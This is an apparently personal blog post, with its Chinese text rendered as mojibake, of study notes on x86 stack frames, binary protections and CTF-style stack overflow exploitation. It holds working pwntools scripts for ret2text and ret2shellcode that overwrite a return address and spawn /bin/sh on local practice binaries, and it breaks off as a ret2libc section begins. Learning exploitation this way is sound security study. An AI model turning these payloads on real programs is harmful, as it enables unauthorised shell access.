<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="zach0ry">
    
    <title>
        
            åˆè¯†æ ˆæº¢å‡º |
        
        b1nary
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    
        <link rel="shortcut icon" href="/images/fire.svg">
    
    
<link rel="stylesheet" href="/font/css/fontawesome.min.css">

    
<link rel="stylesheet" href="/font/css/regular.min.css">

    
<link rel="stylesheet" href="/font/css/solid.min.css">

    
<link rel="stylesheet" href="/font/css/brands.min.css">

    
    <script class="keep-theme-configurations">
    const KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en"}
    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"b1nary","author":"zach0ry","avatar":"/images/author.jpg","logo":"/images/fire.svg","favicon":"/images/fire.svg"},"menu":{"home":"/","archives":"/archives"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":false,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"toc":{"enable":false,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":false,"preload":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
<div class="progress-bar-container">
    

    
</div>



<main class="page-container border-box">
    <!-- home first screen  -->
    

    <!-- page content -->
    <div class="page-main-content border-box">
        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="border-box header-content">
        <div class="left flex-start border-box">
            
                <a class="logo-image border-box" href="/">
                    <img src="/images/fire.svg">
                </a>
            
            <a class="site-name border-box" href="/">
               b1nary
            </a>
        </div>

        <div class="right border-box">
            <div class="pc border-box">
                <ul class="menu-list border-box">
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/">
                                
                                HOME
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/archives">
                                
                                ARCHIVES
                                
                            </a>
                            
                        </li>
                    
                    
                </ul>
            </div>
            <div class="mobile border-box flex-start">
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list border-box">
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
                            
                            HOME
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
                            
                            ARCHIVES
                        </a>
                        
                    </label>
                    
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle border-box">

            <div class="main-content border-box">
                

                    
<div class="fade-in-down-animation">
    <div class="post-page-container border-box">
        <div class="post-content-container border-box">
            

            <div class="post-content-bottom border-box">
                
                    <div class="post-title">
                        åˆè¯†æ ˆæº¢å‡º
                    </div>
                

                
                    <div class="post-header border-box">
                        
                            <div class="avatar-box border-box">
                                <img src="/images/author.jpg">
                            </div>
                        
                        <div class="info-box">
                            <div class="author border-box">
                                <span class="name">zach0ry</span>
                                
                                    <span class="author-badge">Lv3</span>
                                
                            </div>
                            <div class="meta-info border-box">
                                

<div class="post-meta-info-container border-box post">
    <div class="post-meta-info border-box">
        

        
            <span class="meta-info-item post-create-date">
                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
                <span class="datetime">2025-07-05 12:06:13</span>
            </span>

            
                <span class="meta-info-item post-update-date">
                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
                    <span class="datetime" data-updated="Tue Aug 26 2025 17:09:44 GMT+0800">2025-08-26 17:09:44</span>
                </span>
            
        

        
            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                <ul class="post-category-ul">
                    
                            <li class="category-item"><a href="/categories/pwn-study/">pwn_study</a></li>
                        
                    
                </ul>
            </span>
        

        
            <span class="post-tag meta-info-item border-box">
                <ul class="post-tag-ul">
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/PWN/">PWN</a></li>
                        
                    
                </ul>
            </span>
        

        
        
        
        
    </div>

    
</div>

                            </div>
                        </div>
                    </div>
                

                <div class="post-content keep-markdown-body ">
                    

                    
                         <p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage@latest/test/image-20250711171334911.png"  alt="img"></p>
<h2 id="fun-a-b-è°ƒç”¨è¿‡ç¨‹"><a href="#fun-a-b-è°ƒç”¨è¿‡ç¨‹" class="headerlink" title="fun(a,b)è°ƒç”¨è¿‡ç¨‹"></a>fun(a,b)è°ƒç”¨è¿‡ç¨‹</h2><p><strong>å…¥æ ˆ</strong></p>
<p>ï¼ˆ1ï¼‰<strong>å‹å…¥å‚æ•°</strong> </p>
<p>æ ¹æ®è°ƒç”¨çº¦å®šï¼Œ<code>main</code>å‡½æ•°ä½œä¸ºè°ƒç”¨è€…ï¼Œé¦–å…ˆéœ€è¦å°†<code>func</code>å‡½æ•°çš„ä¸¤ä¸ªå‚æ•°a,bå‹å…¥æ ˆä¸­ã€‚</p>
<p>æ³¨æ„å‹å…¥å‚æ•°çš„é¡ºåºï¼Œé¦–å…ˆå‹å…¥bï¼Œæ¥ç€å‹å…¥aï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå‹å…¥å‚æ•°çš„é¡ºåºæ˜¯<strong>ä»å³åˆ°å·¦</strong>ã€‚</p>
<p>ï¼ˆ2ï¼‰<strong>è¿”å›åœ°å€å‹æ ˆ</strong></p>
<p>è¿”å›åœ°å€å‹æ ˆã€‚mainå‡½æ•°ä¸ºäº†è®©<code>func</code>å‡½æ•°è°ƒç”¨åæ­£å¸¸è¿”å›ï¼Œéœ€è¦å°†å½“å‰æŒ‡ä»¤ï¼ˆcallæŒ‡ä»¤ï¼‰çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€å‹å…¥æ ˆä¸­</p>
<p>callæŒ‡ä»¤åŒ…å«ä¸¤ä¸ªæ­¥éª¤ï¼šmainå‡½æ•°çš„ä¸‹ä¸€æ¡æŒ‡ä»¤å‹æ ˆï¼›æ§åˆ¶eipä¸º<code>func</code>å‡½æ•°çš„ç¬¬ä¸€æ¡è¯­å¥ï¼Œeipå­˜å‚¨ç€CPUå°†è¦æ‰§è¡Œçš„æŒ‡ä»¤çš„åœ°å€</p>
<p>ï¼ˆ3ï¼‰<strong>funcå‡½æ•°è¿è¡Œ</strong></p>
<p><code>func</code>å‡½æ•°éœ€è¦è‡ªå·±çš„å†…éƒ¨è¿ä½œç©ºé—´ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤åºåˆ—å¼€è¾Ÿç©ºé—´ï¼š<code>push ebp</code>   <code>mov ebp,esp</code>  <code>sub esp,28h</code></p>
<p>è¿™ä¸ª28hå°±æ˜¯å¼€è¾Ÿçš„å­˜å‚¨<code>func</code>å‡½æ•°çš„ç›¸å…³å†…å­˜çš„ç©ºé—´</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171403792.png"  alt="image-20250711171403792"></p>
<p><code>mov ebp,esp</code>çœ‹ä¼¼æ²¡æœ‰å˜åŒ–ï¼Œä½†EBP ä»â€œä¿å­˜è°ƒç”¨è€…åŸºå€â€å˜ä¸ºâ€œå½“å‰å‡½æ•°çš„æ ˆå¸§åŸºå€â€ã€‚</p>
<p>ï¼ˆ4ï¼‰<strong>funcå‡½æ•°çš„å±€éƒ¨å˜é‡å’Œå‚æ•°</strong></p>
<p><code>func</code>å‡½æ•°æœ‰è‡ªå·±å†…éƒ¨çš„è¿ä½œç©ºé—´ï¼Œå³func_ebpåˆ°func_esp</p>
<p>å±€éƒ¨å˜é‡åœ¨ç¼–è¯‘ä¹‹åä¼šè¢«è¡¨ç¤ºä¸ºä¸ebp ä¸åŒçš„è·ç¦»</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage@latest/test/image-20250711171421699.png"  alt="img"></p>
<p>v2è¢«è¡¨ç¤ºä¸ºebp -18hï¼Œv3è¢«è¡¨ç¤ºä¸ºebp -10hã€‚</p>
<p>æ³¨æ„ï¼Œè¿™é‡Œçš„v2, v3å’Œv4éƒ½æ˜¯å±€éƒ¨å˜é‡ã€‚å‚æ•°çš„è¯»å–æ–¹å¼ä¾‹å­:ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ebp+8ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ebp+12</p>
<p>å› ä¸ºè°ƒç”¨çº¦å®šï¼Œè‚¯å®šæœ‰main_nextå’Œmain_ebpåœ¨ebpçš„ä¸Šæ–¹ï¼Œæ•…åç§»æ˜¯å›ºå®šçš„ï¼Œåœ¨è¿”å›åœ°å€main_nextä¸Šé¢</p>
<p>ç„¶åï¼Œ<code>func</code>å‡½æ•°è¿”å›ã€‚ä¸¤ä¸ªæ­¥éª¤ï¼šæ¸…é™¤æ ˆç©ºé—´ï¼Œè¿”å›åˆ°ä¹‹å‰æ‰§è¡Œçš„æŒ‡ä»¤ï¼ˆmain_nextï¼‰å¤„ã€‚</p>
<p>(5)<strong>funcå‡½æ•°è¿”å›æ­¥éª¤1:æ¸…é™¤æ ˆç©ºé—´</strong></p>
<p>æ¯ä¸ªå‡½æ•°æ¸…é™¤æ ˆç©ºé—´æ—¶å¯ä»¥ä½¿ç”¨ä¸€æ¡å…¬ç”¨æŒ‡ä»¤leaveã€‚</p>
<p>leaveåŒ…å«ä¸¤ä¸ªæ­¥éª¤ï¼š</p>
<p>â‘ <code>mov esp,ebp</code>å°†æ ˆé¡¶è®¾ç½®ä¸ºæ ˆåŸºï¼Œå³å°†func_ebpåˆ°func_espçš„å†…å®¹å…¨éƒ¨å‡ºæ ˆï¼›</p>
<p>â‘¡<code>pop ebp</code> å°†main_ebpçš„å†…å®¹é‡æ–°å¼¹å›ebpï¼Œä½¿mainå‡½æ•°çš„æ ˆåŸºå€å¾—åˆ°æ¢å¤</p>
<p>(6)<strong>funcå‡½æ•°è¿”å›æ­¥éª¤2ï¼šè¿”å›ä¹‹å‰æ‰§è¡Œçš„æŒ‡ä»¤ï¼ˆmain_nextï¼‰å¤„</strong></p>
<p>æ¯ä¸ªå‡½æ•°è¿”å›æ—¶å¯ä»¥ä½¿ç”¨ä¸€æ¡å…¬ç”¨æŒ‡ä»¤retã€‚retåŒ…å«ä¸€ä¸ªæ­¥éª¤ï¼šå°†æ ˆé¡¶å¼¹å‡ºåˆ°eipå¯„å­˜å™¨ï¼ˆå³ä¸‹ä¸€æ¡æŒ‡ä»¤çš„ä½ç½®ï¼‰ï¼Œè¾¾åˆ°æ¢å¤mainå‡½æ•°æ‰§è¡Œé¡ºåºçš„</p>
<p>ç›®çš„ã€‚</p>
<p>åˆ°è¿™é‡Œï¼Œmainå‡½æ•°çš„æ ˆåŸºå€å’Œä¸‹ä¸€æ¡æŒ‡ä»¤éƒ½å¾—åˆ°äº†æ¢å¤ï¼Œä¹Ÿå°±å®Œæˆäº†æ•´ä¸ªfuncå‡½æ•°çš„è°ƒç”¨ã€‚</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage@latest/test/image-20250711171510506.png"  alt="img"></p>
<h2 id="Linuxæ“ä½œç³»ç»Ÿçš„ä¿æŠ¤"><a href="#Linuxæ“ä½œç³»ç»Ÿçš„ä¿æŠ¤" class="headerlink" title="Linuxæ“ä½œç³»ç»Ÿçš„ä¿æŠ¤"></a>Linuxæ“ä½œç³»ç»Ÿçš„ä¿æŠ¤</h2><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171532889.png"  alt="img"></p>
<p> <code>Arch:amd64-64-little</code>ï¼š</p>
<p>amd64å³x86_64(CPUæ¶æ„)                 </p>
<p>64å³å­—é•¿ä¸º64ï¼Œè¿”å›åœ°å€åœ¨æ ˆä¸­å  8å­—èŠ‚ï¼Œ32ä½æ˜¯4å­—èŠ‚ï¼‰</p>
<p>littleè¡¨ç¤ºå°ç«¯åºï¼Œå¦‚æœæ˜¯bigåˆ™è¡¨ç¤ºå¤§ç«¯åºã€‚ä»¥æ•°å­—0x12345678ä¸ºä¾‹ï¼Œå°ç«¯åºå­˜å‚¨çš„æ˜¯\x78\x56\x34\x12ï¼Œå¤§ç«¯åºå­˜å‚¨çš„æ˜¯\x12\x34\x56\x78</p>
<p><code>RELROï¼šPartial RELRO</code>:</p>
<p>Partial RELROå’ŒFull RELROçš„åŒºåˆ«å¯ä»¥ç®€å•ç†è§£ä¸ºGOTå†™æƒé™çš„åŒºåˆ«ï¼ŒPartial RELROç›¸å½“äºGOTå¯å†™ï¼ŒFull RELROç›¸å½“äºGOTä¸å¯å†™ã€‚</p>
<p><code>NXï¼šNX enabled</code>:</p>
<p>å¦‚æœå¼€å¯äº†NXä¿æŠ¤æœºåˆ¶ï¼Œé‚£ä¹ˆwæƒé™å’Œxæƒé™å°±æ˜¯äº’æ–¥çš„,å³ä¸å­˜åœ¨æ—¢æ‹¥æœ‰å†™æƒé™åˆæ‹¥æœ‰æ‰§è¡Œæƒé™çš„æ®µã€‚è¿™ä¸ªä¿æŠ¤æœºåˆ¶æ˜¯ç”¨æ¥é˜²æ­¢shellcodeæ¤å…¥çš„ã€‚åœ¨gdbè°ƒè¯•ä¸­ï¼Œå¯ä»¥é€šè¿‡vmmapå‘½ä»¤æ¥æŸ¥çœ‹æ¯ä¸ªæ®µçš„æƒé™ã€‚</p>
<p><code>PIEï¼šNo PIEï¼ˆ0x8048000ï¼‰</code></p>
<h2 id="ret2text-è¦†ç›–è¿”å›åœ°å€"><a href="#ret2text-è¦†ç›–è¿”å›åœ°å€" class="headerlink" title="ret2text(è¦†ç›–è¿”å›åœ°å€)"></a>ret2text(è¦†ç›–è¿”å›åœ°å€)</h2><p>è¯¥å‡½æ•°å†…å­˜åœ¨getæ¼æ´</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171548307.png"  alt="image-20250711171548307"></p>
<p>è¯¥å‡½æ•°æ³„éœ²äº†åé—¨å‡½æ•°</p>
<p>æ¥ç€é€šè¿‡getså‡½æ•°æ ˆæº¢å‡ºå°†è¿™ä¸ªåœ°å€æ”¹ä¸ºtargetï¼Œé‚£ä¹ˆvulnfuncè¿”å›çš„æ—¶å€™ï¼Œç”¨retæŒ‡ä»¤å–å‡ºæ ˆé¡¶çš„å…ƒç´ è¿”å›ï¼Œå°±ä¼šè¿”å›åˆ°targetè¿™ä¸ªå‡½æ•°</p>
<p>targetå‡½æ•°ä¸­æœ‰systemï¼ˆâ€&#x2F;bin&#x2F;shâ€ï¼‰è¿™ä¸ªåé—¨ï¼Œç±»ä¼¼äºåœ¨Linuxçš„ç»ˆç«¯ç›´æ¥è°ƒç”¨&#x2F;bin&#x2F;shã€‚åˆ©ç”¨è¿™ç§æ–¹å¼å¯ä»¥ç›´æ¥è¿”å›ä¸€ä¸ªshellï¼Œè¿›è€Œå¾—åˆ°ç›®æ ‡ä¸»æœºçš„shellï¼Œæ‹¿åˆ°æ§åˆ¶æƒã€‚</p>
<p>æ‰¾å¡«å……å­—èŠ‚</p>
<p>ç›´æ¥ä»IDAä¸­è¯»å‡ºé•¿åº¦</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171603088.png"  alt="image-20250711171603088"></p>
<p>såˆ°vulnfuncçš„ebpçš„è·ç¦»æ˜¯108hï¼Œæ‰€ä»¥åˆ°main_nextçš„è·ç¦»æ˜¯0x108+4</p>
<p>é‚£ä¸ª4æ˜¯32ä½çš„ebpçš„ç©ºé—´</p>
<h3 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&quot;./ret2text&quot;)</span><br><span class="line">p.recvuntil(&quot;ret2text\n&quot;)</span><br><span class="line">payload = b&#x27;a&#x27;* (0x108+4) + p32(0x0804850B)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="ret2shellcodeï¼ˆè¦†ç›–è¿”å›åœ°å€åˆ°Shellcodeï¼‰"><a href="#ret2shellcodeï¼ˆè¦†ç›–è¿”å›åœ°å€åˆ°Shellcodeï¼‰" class="headerlink" title="ret2shellcodeï¼ˆè¦†ç›–è¿”å›åœ°å€åˆ°Shellcodeï¼‰"></a>ret2shellcodeï¼ˆè¦†ç›–è¿”å›åœ°å€åˆ°Shellcodeï¼‰</h2><p>Shellcodeæ˜¯<strong>æœºå™¨ç æ ¼å¼çš„æ¶æ„ä»£ç </strong>ï¼ŒæŒ‡çš„æ˜¯ç”¨äºå®ŒæˆæŸä¸ªåŠŸèƒ½çš„æ±‡ç¼–ä»£ç ï¼Œå¸¸ç”¨çš„åŠŸèƒ½æ˜¯è·å–ç›®æ ‡ç³»ç»Ÿçš„shellã€‚åœ¨æ ˆæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œæˆ‘ä»¬ä¸€èˆ¬éƒ½æ˜¯å‘æ ˆä¸­å†™å†…å®¹ï¼Œæ‰€ä»¥è¦æƒ³æ‰§è¡ŒShellcodeï¼Œå°±è¦æ±‚å¯¹åº”çš„äºŒè¿›åˆ¶æ–‡ä»¶æ²¡æœ‰å¼€å¯NXä¿æŠ¤</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171705724.png"  alt="image-20250711171705724"></p>
<p> <code>printf(&quot;%p\n&quot;, s)</code>è¾“å‡ºäº†Sçš„ç¼“å†²åŒºçš„ä½ç½®</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171725511.png"  alt="image-20250711171725511"></p>
<p>æ²¡æœ‰å¼€å¯NXä¿æŠ¤</p>
<p>æ‰€ä»¥å¯ä»¥å‘è¿›ç¨‹ä¸­å†™å…¥ä¸€æ®µShellcodeï¼ˆåˆ©ç”¨wå†™æƒé™ï¼‰ï¼Œå†æ‰§è¡Œè¿™æ®µShellcodeï¼ˆåˆ©ç”¨xæ‰§è¡Œæƒé™ï¼‰ã€‚</p>
<h3 id="è„šæœ¬-1"><a href="#è„šæœ¬-1" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.arch = &quot;i386&quot;</span><br><span class="line">p = process(&quot;./ret2shellcode&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b *0x08048593&quot;)</span><br><span class="line">p.recvuntil(b&quot;ret2shellcode\n&quot;) # ä¿®æ”¹ä¸ºå­—èŠ‚ä¸²</span><br><span class="line">target = int(p.recvuntil(b&quot;\n&quot;,drop = True),16) # ä¿®æ”¹ä¸ºå­—èŠ‚ä¸²</span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line">payload = sc+b&#x27;a&#x27; * (0x108 + 4-len(sc))+ p32(target) </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><code>context.arch = &quot;i386&quot;</code>è¯´æ˜ç¨‹åºçš„æ¶æ„ï¼Œä½¿ç”¨ <code>asm()</code> å‡½æ•°å°† shellcode (<code>shellcraft.sh()</code>) æ±‡ç¼–æˆæœºå™¨ç æ—¶ï¼Œ<code>pwntools</code> éœ€è¦çŸ¥é“ç›®æ ‡æ¶æ„æ˜¯ 32 ä½è¿˜æ˜¯ 64 ä½ï¼Œä»¥ä¾¿ç”Ÿæˆæ­£ç¡®çš„æŒ‡ä»¤é›†ã€‚32 ä½å’Œ 64 ä½çš„æŒ‡ä»¤æ˜¯ä¸åŒçš„ã€‚</p>
<p><code>target = int(p.recvuntil(b&quot;\n&quot;,drop = True),16)</code> æ¥æ”¶çŸ¥é“è¯»å–åˆ°&#x2F;nï¼Œ(è¾“å‡ºçš„ç¼“å†²åŒºçš„åœ°å€)ï¼Œè½¬åŒ–ä¸ºåå…­è¿›åˆ¶æ•´æ•°ï¼Œä¸”<code>drop = True</code>æ–¹ä¾¿åœ°<strong>æ¸…ç†</strong>ä½ æ¥æ”¶åˆ°çš„æ•°æ®ã€‚åªæå–æŸä¸ªæ¨¡å¼ï¼ˆæ¯”å¦‚ä¸€ä¸ªåœ°å€ã€ä¸€ä¸ªæ•°å­—æˆ–ä¸€ä¸ªç‰¹å®šçš„å­—ç¬¦ä¸²ï¼‰è€Œä¸åŒ…å«ç”¨äºåˆ†éš”æˆ–ç»ˆæ­¢çš„å­—ç¬¦ï¼ˆå¦‚æ¢è¡Œç¬¦ã€ç©ºæ ¼ã€å†’å·ç­‰ï¼‰</p>
<p><code>sc = asm(shellcraft.sh())</code>ç”Ÿæˆå¯åŠ¨<code>/bin/sh</code>çš„æœºå™¨ç </p>
<p><code>payload = sc+b&#39;a&#39; * (0x108 + 4-len(sc))+ p32(target)</code> ä»å³åˆ°å·¦å…¥æ ˆï¼Œp32(target):è¦†ç›–è¿”å›åœ°å€ï¼Œbâ€™aâ€™ * (0x108 + 4 - len(sc)):å¡«å……ä»scç»“æŸä½ç½®åˆ°è¿”å›åœ°å€ä¹‹é—´æ‰€æœ‰â€œæ— ç”¨â€çš„æ ˆç©ºé—´ã€‚sc:å½“ scä½äºç¼“å†²åŒºçš„èµ·å§‹ä½ç½®ã€‚</p>
<p>context(arch &#x3D; â€˜amd64â€™, os &#x3D; â€˜linuxâ€™, log_level &#x3D; â€˜debugâ€™)</p>
<p>è¿™ç§contextçš„ä¿¡æ¯å¯ä»¥é€šè¿‡æŒ‡ä»¤file+æ–‡ä»¶å å¾—åˆ°</p>
<p>è¾“å‡ºç¤ºä¾‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mrctf2020_shellcode: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, â€¦</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå…³é”®çš„ä¿¡æ¯ï¼š</p>
<ul>
<li><strong>ELF</strong> â†’ è¯´æ˜æ˜¯ Linux</li>
<li><strong>64-bit</strong> â†’ è¯´æ˜æ˜¯ 64 ä½</li>
<li><strong>x86-64</strong> â†’ æ¶æ„å°±æ˜¯ <code>amd64</code>ï¼ˆpwntools é‡Œå†™ <code>amd64</code>ï¼‰</li>
</ul>
<p>å¦‚æœè¾“å‡ºæ˜¯ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELF 32-bit LSB executable, Intel 80386</span><br></pre></td></tr></table></figure>

<p>é‚£ä½ å°±ç”¨ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ˜¯ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELF 32-bit LSB executable, ARM</span><br></pre></td></tr></table></figure>

<p>é‚£ä½ å°±ç”¨ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context(arch=&#x27;arm&#x27;, os=&#x27;linux&#x27;)</span><br></pre></td></tr></table></figure>









<h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><p><strong>NX ä¿æŠ¤ (No-Execute)</strong>: å®ƒçš„<strong>å”¯ä¸€ç›®çš„</strong>æ˜¯é˜»æ­¢ä½ åœ¨<strong>æ•°æ®åŒºåŸŸï¼ˆæ¯”å¦‚æ ˆå’Œå †ï¼‰æ‰§è¡Œä»£ç </strong>ã€‚ä½ å¯ä»¥æŠŠæ ˆå’Œå †æƒ³è±¡æˆä¸€å—â€œåªå†™æ•°æ®ï¼Œä¸èƒ½è·‘ç¨‹åºâ€çš„åŒºåŸŸã€‚</p>
<ul>
<li><strong>å…è®¸ä»€ä¹ˆï¼Ÿ</strong> å…è®¸ä½ åœ¨æ ˆä¸Šå†™æ•°æ®ï¼ˆæ¯”å¦‚å¡«å……å­—ç¬¦ä¸² <code>AAAA</code>ï¼Œæˆ–è€…ä¸€äº›åœ°å€ï¼‰ã€‚ å…è®¸ä½ ä¿®æ”¹å¯„å­˜å™¨çš„å€¼ã€‚ å…è®¸ä½ è¦†ç›–è¿”å›åœ°å€ã€‚</li>
<li><strong>é˜»æ­¢ä»€ä¹ˆï¼Ÿ</strong> é˜»æ­¢ä½ æŠŠè‡ªå·±çš„æ±‡ç¼–ä»£ç ï¼ˆæˆ‘ä»¬ç§°ä¹‹ä¸º Shellcodeï¼‰æ”¾åœ¨æ ˆä¸Šï¼Œç„¶åè®©ç¨‹åºå»æ‰§è¡Œå®ƒã€‚</li>
</ul>
<h3 id="ret2libc1ï¼ˆå•ä¸ªå‡½æ•°çš„ropæ¥é“¾ï¼‰"><a href="#ret2libc1ï¼ˆå•ä¸ªå‡½æ•°çš„ropæ¥é“¾ï¼‰" class="headerlink" title="ret2libc1ï¼ˆå•ä¸ªå‡½æ•°çš„ropæ¥é“¾ï¼‰"></a>ret2libc1ï¼ˆå•ä¸ªå‡½æ•°çš„ropæ¥é“¾ï¼‰</h3><p>ç¬¬ä¸€æ­¥ï¼Œå…ˆçœ‹ä¿æŠ¤</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713170101689.png"  alt="image-20250713170101689"></p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713170137922.png"  alt="image-20250713170137922"></p>
<p>getæº¢å‡º</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713165720453.png"  alt="image-20250713165720453"></p>
<p>systemå‡½æ•°å­˜åœ¨,ä½†å‚æ•°ä¸æ˜¯&#x2F;bin&#x2F;sh</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713165931741.png"  alt="image-20250713165931741"></p>
<p>systemå‡½æ•°å­˜åœ¨,å¹¶ä¸”ç¨‹åºä¸­å¿ƒå­˜åœ¨bin&#x2F;shå­—ç¬¦ä¸²</p>
<p>æ‰€ä»¥å¯ä»¥æŠŠbin&#x2F;shä½œä¸ºå‚æ•°ä¼ å…¥systemå‡½æ•°ä¸­æ„é€ åé—¨å‡½æ•°</p>
